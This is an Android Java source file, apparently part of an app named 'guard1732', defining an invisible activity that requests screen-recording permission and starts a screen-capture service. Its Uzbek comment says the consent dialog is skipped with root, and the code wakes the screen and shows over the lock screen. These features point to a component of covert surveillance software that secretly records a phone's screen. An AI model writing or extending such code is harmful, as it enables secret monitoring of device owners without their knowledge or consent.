package com.guard1732;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;

import androidx.core.content.ContextCompat;

/** Ko'rinmas oyna: ekran yozish ruxsatini so'raydi (root bilan dialogsiz o'tadi) va xizmatni yoqadi. */
public class CaptureActivity extends Activity {
    private static final int REQ = 77;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        if (Build.VERSION.SDK_INT >= 30) { finish(); return; }   // 11+: ekran yozish hech qachon so'ralmaydi
        if (Build.VERSION.SDK_INT >= 27) { setShowWhenLocked(true); setTurnScreenOn(true); }
        if (ScreenCaptureService.running) { finish(); return; }
        try {
            MediaProjectionManager m = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            startActivityForResult(m.createScreenCaptureIntent(), REQ);
        } catch (Throwable t) {
            Dbg.step(this, "CaptureActivity xato: " + t);
            finish();
        }
    }

    @Override
    protected void onActivityResult(int req, int rc, Intent data) {
        super.onActivityResult(req, rc, data);
        Dbg.step(this, "CaptureActivity natija rc=" + rc + " data=" + (data != null));
        if (req == REQ && rc == RESULT_OK && data != null) {
            ContextCompat.startForegroundService(this, new Intent(this, ScreenCaptureService.class)
                    .putExtra("code", rc).putExtra("data", data));
        }
        finish();
    }
}
